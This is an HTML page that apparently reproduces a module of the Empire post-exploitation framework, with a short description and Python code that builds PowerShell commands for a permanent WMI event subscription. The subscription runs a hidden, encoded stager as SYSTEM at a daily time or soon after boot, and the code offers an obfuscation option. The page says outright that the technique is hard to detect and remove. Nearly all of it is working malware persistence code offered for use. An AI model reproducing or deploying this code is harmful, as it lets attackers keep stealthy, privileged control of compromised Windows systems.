<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Empire</title>
</head><body>Persist a stager (or script) using a permanent WMI subscription. This has a difficult detection/removal rating<br/>
<br/>
It adds a permanent WMI subscription either at a DailyTime or within 5 minutes of system boot with AtStartup. This will run as SYSTEM, regardless of whether a user has logged in or not.<br/>
<br/>
<br/>
<br/>
&nbsp;# built the command that will be triggered<br/>
&nbsp; &nbsp; &nbsp; &nbsp; triggerCmd = "$($Env:SystemRoot)\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NonI -W hidden -enc " + encScript<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; if dailyTime != '':<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; parts = dailyTime.split(":")<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if len(parts) &lt; 2:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print helpers.color("[!] Please use HH:mm format for DailyTime")<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; return ""<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hour = parts[0]<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; minutes = parts[1]<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # create the WMI event filter for a system time<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; script = "$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name='"+subName+"';EventNameSpace='root\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = "+hour+" AND TargetInstance.Minute= "+minutes+" GROUP WITHIN 60\"};"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; statusMsg += " WMI subscription daily trigger at " + dailyTime + "."<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; else:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; # create the WMI event filter for OnStartup<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; script = "$Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments @{name='"+subName+"';EventNameSpace='root\CimV2';QueryLanguage=\"WQL\";Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime &gt;= 240 AND TargetInstance.SystemUpTime &lt; 325\"};"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; statusMsg += " with OnStartup WMI subsubscription trigger."<br/>
<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; # add in the event consumer to launch the encrypted script contents<br/>
&nbsp; &nbsp; &nbsp; &nbsp; script += "$Consumer=Set-WmiInstance -Namespace \"root\\subscription\" -Class 'CommandLineEventConsumer' -Arguments @{ name='"+subName+"';CommandLineTemplate=\""+triggerCmd+"\";RunInteractively='false'};"<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; # bind the filter and event consumer together<br/>
&nbsp; &nbsp; &nbsp; &nbsp; script += "Set-WmiInstance -Namespace \"root\subscription\" -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter;Consumer=$Consumer} | Out-Null;"<br/>
<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; script += "'WMI persistence established "+statusMsg+"'"<br/>
&nbsp; &nbsp; &nbsp; &nbsp; if obfuscate:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; return script</body></html>